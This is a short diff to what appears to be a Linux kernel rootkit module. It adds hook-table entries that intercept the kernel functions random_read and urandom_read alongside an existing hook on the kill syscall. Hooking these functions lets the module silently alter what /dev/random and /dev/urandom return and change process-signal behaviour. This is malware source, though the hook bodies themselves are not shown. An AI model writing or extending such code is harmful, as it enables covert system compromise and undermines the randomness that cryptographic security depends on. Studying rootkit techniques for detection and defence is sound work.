@@ -2,6 +2,7 @@
 #include "hook.h"
 #include "kill.h"
 #include "mkdir.h"
+#include "random.h"
 
 #include <linux/init.h>
 #include <linux/kernel.h>
@@ -21,6 +22,9 @@ struct hook hooks[] = {
     //{ .name = "__x64_sys_execve", .func = execve_hook, .orig_ptr = (void **)&execve_orig },
     
     { .name = "__x64_sys_kill", .func = kill_hook, .orig_ptr = (void **)&kill_orig },
+
+    { .name = "random_read", .func = random_read_hook, .orig_ptr = (void **)&random_read_orig },
+    { .name = "urandom_read", .func = urandom_read_hook, .orig_ptr = (void **)&urandom_read_orig },
 };
 
 static int __init init(void) {
